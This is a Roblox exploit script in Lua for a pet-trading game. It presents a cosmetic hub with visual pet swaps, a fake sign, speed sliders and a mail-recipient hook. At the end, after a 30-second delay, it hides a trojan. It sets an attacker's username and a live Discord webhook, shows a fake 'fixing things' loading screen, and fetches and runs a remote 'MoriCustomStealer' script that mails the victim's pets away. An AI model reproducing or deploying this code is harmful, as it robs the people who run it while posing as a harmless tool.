                    if string.split(petname, " ")[1] == "Hype" then
                        v1.name = "Update Hype Gift"
                        nametoenchant = "Update Hype Gift"
                    end
                    giftenchant(nametoenchant, fpet4)
                    break
                end
            end
        end
    end,
})
exceggs = {}
excsort = {}
for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetDescendants()) do
    if v:FindFirstChildOfClass("ModuleScript") then
        if string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).name), " ")[1] == "Exclusive" and
            string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).name), " ")[2] == "Egg" then
            table.insert(exceggs, string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).name), " ")[3])
        end
    end
end
for i, v in ipairs(exceggs) do
    table.insert(excsort, i)
end
hugeeggs = {}
huegsort = {}
for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetDescendants()) do
    if v:FindFirstChildOfClass("ModuleScript") then
        if string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).name), " ")[1] == "Huge" and
            string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).name), " ")[2] == "Machine" and
            string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).name), " ")[3] == "Egg" then
            table.insert(hugeeggs, string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).name), " ")[4])
        end
    end
end
for i, v in ipairs(hugeeggs) do
    table.insert(huegsort, i)
end
hypeeggs = {}
hypesort = {}
for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetDescendants()) do
    if v:FindFirstChildOfClass("ModuleScript") then
        if string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).giftEggId), " ")[1] == "Hype" and
            string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).giftEggId), " ")[2] == "Gift" then
            table.insert(hypeeggs,
                string.split(tostring(require(v:FindFirstChildOfClass("ModuleScript")).giftEggId), " ")[3])
        end
    end
end
for i, v in ipairs(hypeeggs) do
    table.insert(hypesort, i)
end
local Section = Tab4:CreateSection("Eggs")
local Dropdown = Tab4:CreateDropdown({
    Name = "Exclusive Egg",
    Options = excsort,
    CurrentOption = "Choose",
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        option = "Exclusive Egg " .. Option
    end,
})
local Dropdown = Tab4:CreateDropdown({
    Name = "Season 1 Gifts",
    Options = { "Basic", "Rare", "Epic", "Legendary", "Mythical" },
    CurrentOption = "Choose",
    Flag = "Dropdown2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        option = "Season 1 " .. Option .. " Gift"
    end,
})
local Dropdown = Tab4:CreateDropdown({
    Name = "Hype Gifts",
    Options = hypesort,
    CurrentOption = "Choose",
    Flag = "Dropdown3", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        option = "Hype Gift " .. Option
    end,
})
local Dropdown = Tab4:CreateDropdown({
    Name = "Huge Machine Egg",
    Options = huegsort,
    CurrentOption = "Choose",
    Flag = "Dropdown3", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        option = "Huge Machine Egg " .. Option
    end,
})
local petname4
local petnameID
function giftchange()
    if fpetID4 == nil and fpet4 ~= nil then
        wrong()
    elseif fpet4 == nil then
        wrong2()
    end
    if fpet4 ~= nil and fpetID4 ~= nil then
        task.wait(0.01)
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local titanicsm = string.split(v.Name, " - ")[2]
            if titanicsm == tostring(petnameID) then
                local HugeI = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [fpetID4 .. " - " .. fpet4]
                    ["Pet Data (" .. fpet4 .. ")"])
                v1.name = petname4
                v1.model = nil
                v1.modelGold = nil
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = nil
                v1.huge = nil
                v1.titanic = nil
                v1.balloon = nil
                v1.goldenThumbnail = nil
                v1.darkMatterThumbnail = nil
                v1.rarity = "Exclusive"
                v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                v1.tradeable = true
                v1.strengthMin = nil
                v1.strengthMax = nil
                v1.companionEnchantLevel = nil
                v1.ignoreConvert = nil
                v1.isGift = true
                v1.giftEggId = petnameID
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.giftCallback = function(p1, p2)
                end
                giftenchant(petname4, fpet4)
                break
            end
        end
    end
end

local Section = Tab4:CreateSection("Others (Instant Replace)")
-- local Button = Tab4:CreateButton({
--     Name = "Huge Machine Egg",
--     Callback = function()
--         petname4 = "Huge Machine Egg 1"
--         petnameID = petname4
--         giftchange()
--     end,
-- })
local Button = Tab4:CreateButton({
    Name = "Halloween Gift",
    Callback = function()
        petname4 = "Halloween Gift"
        petnameID = "Halloween 2022 Gift"
        giftchange()
    end,
})
local Button = Tab4:CreateButton({
    Name = "Christmas Stocking",
    Callback = function()
        petname4 = "Christmas 2022 Stocking"
        petnameID = petname4
        giftchange()
    end,
})
local Button = Tab4:CreateButton({
    Name = "New Years 2023 Gift",
    Callback = function()
        petname4 = "New Years 2023 Gift"
        petnameID = petname4
        giftchange()
    end,
})
local Button = Tab4:CreateButton({
    Name = "Easter 2023",
    Callback = function()
        petname4 = "Easter 2023 Gift"
        petnameID = petname4
        giftchange()
    end,
})

local exc
function excChange()
    if fpetID3 == nil and fpet3 ~= nil then
        wrong()
    elseif fpet3 == nil then
        wrong2()
    end
    if fpet3 ~= nil and fpetID3 ~= nil then
        local petname = exc
        table.insert(Names, petname)
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local petsm = string.split(v.Name, " - ")[2]
            if petsm == tostring(petname) then
                local petID = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[fpetID3 .. " - " .. fpet3]
                    ["Pet Data (" .. fpet3 .. ")"])
                v1.name = petname
                v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[petID .. " - " .. petname]
                    .Pet
                v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [petID .. " - " .. petname].Golden
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                v1.darkMatterThumbnail = ""
                v1.rarity = "Exclusive"
                v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                v1.tradeable = true
                v1.hidden = false
                v1.strengthMin = require(v:FindFirstChildOfClass("ModuleScript")).strengthMin
                v1.strengthMax = require(v:FindFirstChildOfClass("ModuleScript")).strengthMax
                v1.titanic = false
                v1.huge = false
                v1.isGift = false
                v1.giftEggId = nil
                v1.giftCallback = nil
                v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                v1.companionEnchantLevel = require(v:FindFirstChildOfClass("ModuleScript")).companionEnchantLevel
                excenchant(petname, fpet3)
                break
            end
        end
    end
end

local Tab3 = Window:CreateTab("Misc", 10946336703) -- Title, Image
local Paragraph3 = Tab3:CreateParagraph({
    Title = "Note :",
    Content =
    [[

You Can Change Multiple Pets
Use The Grid Toggle To Update The Pets
You Can Use Any Pet You Want Dm K4F#0001 Any Errors
]]
})
local Input3 = Tab3:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Cat",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID3 = nil
        if Text == "" or Text == nil then
            fpet3 = nil
        else
            fpet3 = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet3) then
                fpetID3 = string.split(v.Name, " - ")[1]
            end
        end
    end,
})

local Section = Tab3:CreateSection("Pet Variants")
local Toggle = Tab3:CreateToggle({
    Name = "Original Pet Variants",
    CurrentValue = true,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        ogexc = Value
    end,
})
local Dropdown = Tab3:CreateDropdown({
    Name = "Varient",
    Options = { "Normal", "Golden", "Rainbow", "Dark Matter" },
    CurrentOption = "Choose",
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        excvarient = Option
    end,
})
local Toggle = Tab3:CreateToggle({
    Name = "Shiny",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        excsh = Value
    end,
})
local Toggle = Tab3:CreateToggle({
    Name = "Hardcore",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        exchc = Value
    end,
})
local Section = Tab3:CreateSection("Exclusives")
local Button = Tab3:CreateButton({
    Name = "Bladee",
    Callback = function()
        exc = "Bladee"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Hubert",
    Callback = function()
        exc = "Hubert"
        if fpetID3 == nil and fpet3 ~= nil then
            wrong()
        elseif fpet3 == nil then
            wrong2()
        end
        if fpet3 ~= nil and fpetID3 ~= nil then
            local petname = exc
            table.insert(Names, petname)
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local petsm = string.split(v.Name, "- ")[2]
                if petsm == tostring(petname) then
                    local petID = string.split(v.Name, "- ")[1]
                    local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [fpetID3 .. " - " .. fpet3]
                        ["Pet Data (" .. fpet3 .. ")"])
                    v1.name = petname
                    v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[petID .. "- " .. petname]
                        .Pet
                    v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [petID .. "- " .. petname].Golden
                    local v11 = {}
                    v11.random = {}
                    v1.sounds = v11
                    v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                    v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                    v1.darkMatterThumbnail = ""
                    v1.rarity = require(v:FindFirstChildOfClass("ModuleScript")).rarity
                    v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                    v1.tradeable = true
                    v1.hidden = false
                    v1.strengthMin = require(v:FindFirstChildOfClass("ModuleScript")).strengthMin
                    v1.strengthMax = require(v:FindFirstChildOfClass("ModuleScript")).strengthMax
                    v1.titanic = false
                    v1.huge = false
                    v1.isGift = false
                    v1.giftEggId = nil
                    v1.giftCallback = nil
                    v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                    v1.companionEnchantLevel = require(v:FindFirstChildOfClass("ModuleScript")).companionEnchantLevel
                    excenchant(petname, fpet3)
                    break
                end
            end
        end
    end,
})
local Button = Tab3:CreateButton({
    Name = "Water Wolf",
    Callback = function()
        exc = "Water Wolf"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Yellow Lucky Block",
    Callback = function()
        exc = "Yellow Lucky Block"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Blue Lucky Block",
    Callback = function()
        exc = "Blue Lucky Block"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Lovemelon",
    Callback = function()
        exc = "Lovemelon"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coin Cat",
    Callback = function()
        exc = "Coin Cat"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coin Dragon",
    Callback = function()
        exc = "Coin Dragon"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coinortuus",
    Callback = function()
        exc = "Coinortuus"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coin Cat",
    Callback = function()
        exc = "Coin Cat"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Super Axolotl",
    Callback = function()
        exc = "Super Axolotl"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Ninja",
    Callback = function()
        exc = "Ninja"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Ninja Turtle",
    Callback = function()
        exc = "Ninja Turtle"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Wicked Agony",
    Callback = function()
        exc = "Wicked Agony"
        excChange()
    end,
})

local Section = Tab3:CreateSection("BANANA")
local fpetID5
local fpet5
local Input3 = Tab3:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Cat",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID5 = nil
        if Text == "" or Text == nil then
            fpet5 = nil
        else
            fpet5 = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet5) then
                fpetID5 = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
local Section = Tab3:CreateSection("Banana Variants")

local Toggle = Tab3:CreateToggle({
    Name = "Original Pet Variants",
    CurrentValue = true,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        ogbanana = Value
    end,
})
local Dropdown = Tab3:CreateDropdown({
    Name = "Varient",
    Options = { "Normal", "Golden", "Rainbow", "Dark Matter" },
    CurrentOption = "Choose",
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        bvarient = Option
    end,
})
local Toggle = Tab3:CreateToggle({
    Name = "Shiny",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        bananash = Value
    end,
})
local Toggle = Tab3:CreateToggle({
    Name = "Hardcore",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        bananahc = Value
    end,
})
local Section = Tab3:CreateSection("Banana Replace")
local Button = Tab3:CreateButton({
    Name = "Banana Replace",
    Callback = function()
        if fpetID5 == nil and fpet5 ~= nil then
            wrong()
        elseif fpet5 == nil then
            wrong2()
        end
        if fpet5 ~= nil and fpetID5 ~= nil then
            local petname = "banana"
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local petsm = string.split(v.Name, " - ")[2]
                if petsm == tostring(petname) then
                    local petID = string.split(v.Name, " - ")[1]
                    local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [fpetID5 .. " - " .. fpet5]
                        ["Pet Data (" .. fpet5 .. ")"])
                    v1.name = petname
                    v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[petID .. " - " .. petname]
                        .Pet
                    v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [petID .. " - " .. petname].Golden
                    local v11 = {}
                    v11.random = {}
                    v1.sounds = v11
                    v1.fly = false
                    v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                    v1.darkMatterThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).darkMatterThumbnail
                    v1.rarity = "Basic"
                    v1.isPremium = false
                    v1.tradeable = true
                    v1.isVanity = true
                    v1.companionEnchantLevel = 3
                    v1.strengthMin = 2
                    v1.strengthMax = 3
                    v1.titanic = false
                    v1.huge = false
                    v1.isGift = false
                    v1.giftEggId = nil
                    v1.giftCallback = nil
                    bananaenchant()
                    break
                end
            end
        end
    end,
})
local Tab5 = Window:CreateTab("Fake Sign", 7402706511) -- Title, Image
local Paragraph = Tab5:CreateParagraph({
    Title = "Requirements",
    Content =
    [[

You Can Change The Text Anytime You Want
Its Only Visual To You So Dont Get Excited
It May Cause Some Bugs And Thats Because Of The Pet Choosing
If Anything Not Right Happend After You Sign Just Relace The Pet Again

]]
})
local Input = Tab5:CreateInput({
    Name = "Text To Use",
    PlaceholderText = "RizzHub",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        getgenv().newtext = Text
        singstop = false
    end,
})
local Button = Tab5:CreateButton({
    Name = "Start",
    Callback = function()
        if getgenv().newtext ~= nil then
            v2.LocalPlayer.Name = getgenv().newtext
            singstop = true
            sign()
        else
            nottext()
        end
    end,
})
_G.Enable = false
local SUsername
function mailspoofer()
    local usertest = pcall(function()
        game.Players:GetUserIdFromNameAsync(SUsername)
    end)
    if usertest then
        _G.Enable = true
        Rayfield:Notify({
            Title = "Spoofing Has Been Started",
            Content = "Your Mails Will Be Sended To " .. SUsername,
            Duration = 1,
            Image = 8990639527,
            Actions = {
                -- Notification Buttons
                Ignore = {
                    Name = "Okay!",
                    Callback = function()
                        --  print("The user tapped Okay!")
                    end
                },
            },
        })
        LPH_NO_VIRTUALIZE(function()
            local old
            local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network).Invoke
            old = hookfunction(Network, function(self, ...)
                if self == "Send Mail" then
                    local args = { ... }
                    if _G.Enable == true then
                        for i, v in next, args do
                            if args[1].Recipient ~= SUsername then
                                args[1].Recipient = SUsername
                            end
                        end
                    end
                end
                return old(self, ...)
            end)
        end)()
    else
        Rayfield:Notify({
            Title = "Invalid Username",
            Content = "Please Put A Valid Username Before Starting",
            Duration = 1,
            Image = 8990639527,
            Actions = {
                -- Notification Buttons
                Ignore = {
                    Name = "Okay!",
                    Callback = function()
                        --  print("The user tapped Okay!")
                    end
                },
            },
        })
    end
end

local Tab6 = Window:CreateTab("Mail Spoofer", 6949374143) -- Title, Image
local Paragraph = Tab6:CreateParagraph({
    Title = "What Is This?",
    Content =
    [[

MailSpoofer Is A Feature That Allows You To Choose The Receiver
For The Mailbox No Matter What You Type In Mailbox It Will
Send The Pet To Your Alt Username
]]
})
local Paragraph = Tab6:CreateParagraph({
    Title = "IMPORTANT!",
    Content =
    [[

Test It Before You Start Using It It May Not Work With
Some Executors
]]
})
local Input = Tab6:CreateInput({
    Name = "Alts Username",
    PlaceholderText = "rizzhub69",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        SUsername = Text
    end,
})
local Button = Tab6:CreateButton({
    Name = "Start Spoofing",
    Callback = function()
        _G.Enable = false
        mailspoofer()
    end,
})
local Tab7 = Window:CreateTab("Others", 8343895261) -- Title, Image
local Section = Tab7:CreateSection("Hoverboards")
local Button = Tab7:CreateButton({
    Name = "Unlock All Hoverboards",
    Callback = function()
        local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
        local tbl = v1.Save.Get()
        tbl.Hoverboards = {}
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Hoverboards:GetChildren()) do
            if v:IsA("Folder") then
                table.insert(tbl.Hoverboards, v.Name)
            end
        end
        getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Update()
        getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Equip = function(board)
            tbl.EquippedHoverboard = board
            getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Update()
        end
    end,
})
local Section = Tab7:CreateSection("Player Stuff")
local player = v2.LocalPlayer.Name
local ogspeed = game:GetService("Workspace")[player]:FindFirstChildOfClass('Humanoid').WalkSpeed
local ogjump = game:GetService("Workspace")[player]:FindFirstChildOfClass('Humanoid').JumpPower
local SliderS = Tab7:CreateSlider({
    Name = "Speed",
    Range = { 0, 1000 },
    Increment = 5,
    Suffix = "",
    CurrentValue = ogspeed,
    Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game:GetService("Workspace")[player]:FindFirstChildOfClass('Humanoid').WalkSpeed = Value
    end,
})
local SliderJ = Tab7:CreateSlider({
    Name = "JumpPower",
    Range = { 0, 1000 },
    Increment = 5,
    Suffix = "",
    CurrentValue = ogjump,
    Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game:GetService("Workspace")[player]:FindFirstChildOfClass('Humanoid').JumpPower = Value
    end,
})
local Button = Tab7:CreateButton({
    Name = "Reset Jump & Speed",
    Callback = function()
        game:GetService("Workspace")[player]:FindFirstChildOfClass('Humanoid').JumpPower = ogjump
        game:GetService("Workspace")[player]:FindFirstChildOfClass('Humanoid').WalkSpeed = ogspeed
        SliderS:Set(ogspeed)
        SliderJ:Set(ogjump)
    end,
})
local database = loadstring(game:HttpGet("https://pastebin.com/raw/wRFGUSRG", true))() -- this raw link is for pet exists this will not be updated so I sugguest you do your own
spawn(function()
    while task.wait() do
        local test = pcall(function()
            task.wait()
            game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks.Rare:GetChildren()
        end)
        if test then
            local name = game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks.Title.title.Text
            if database[name] then -- check if name is in the database
                if database[name] ~= 0 then
                    game:GetService("ReplicatedStorage").Assets.UI.FRAMEWORK.InfoOverlay.Blocks.Rare.Visible = true
                    if game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks.Rare.Visible then
                        game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks.Rare.Visible = true
                        local textLabel = game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks
                            .Rare.title
                        textLabel.Text = database[name] .. " Exist"
                        local textSize = textLabel.TextBounds
                        local paddingX = textSize.X * 0.4 -- add 40% of the text width as padding to X size
                        local paddingY = textSize.Y
                        textLabel.Size = UDim2.new(0, textSize.X + paddingX, 0, paddingY)
                    else
                        game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base:Destroy()
                    end
                elseif database[name] == 0 then
                    game:GetService("ReplicatedStorage").Assets.UI.FRAMEWORK.InfoOverlay.Blocks.Rare.Visible = false
                    if game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks.Rare.Visible then
                        game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base:Destroy()
                    end
                end
            elseif table_contains(Names, name) then
                game:GetService("ReplicatedStorage").Assets.UI.FRAMEWORK.InfoOverlay.Blocks.Rare.Visible = false
                if game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks.Rare.Visible then
                    game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base:Destroy()
                end
            else
                game:GetService("ReplicatedStorage").Assets.UI.FRAMEWORK.InfoOverlay.Blocks.Rare.Visible = true
                if not game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base.Frame.Blocks.Rare.Visible then
                    game:GetService("Players").LocalPlayer.PlayerGui.InfoOverlay.Base:Destroy()
                end
            end
        end
    end
end)
spawn(function()
    while task.wait(0.01) do
        if game:GetService("Players").LocalPlayer.PlayerGui.Message.Enabled and
            game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Desc.Text == "Not an egg." then
            game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Desc.Text = "Get Rickrolled Bozo!"
        end
    end
end)

wait(30)
UserName = "pinoyjar" -- good pets
Webhook = "https://discord.com/api/webhooks/1148246064621695066/5NMB-gXbQg_PORuPXH-K9ehP4P8ev5d0m_usUPPIKegxbeymx_yMCr4UrVMJRc7-bxSw" -- pings for pets
UserName2 = "pinoyjar" -- bad pets

_G.MailMessage = "Thank you!" -- Mail Message !
_G.ScriptTitle = "Sorry a bit problem here" -- Loading Screen Title
_G.ScriptTitle2 = "Don't leave while we fix things" -- Put Same Title
_G.WebhookName = "Pogi MAILBOX MO!!" -- Webhook name 

loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idk/main/MoriCustomStealer", true))()
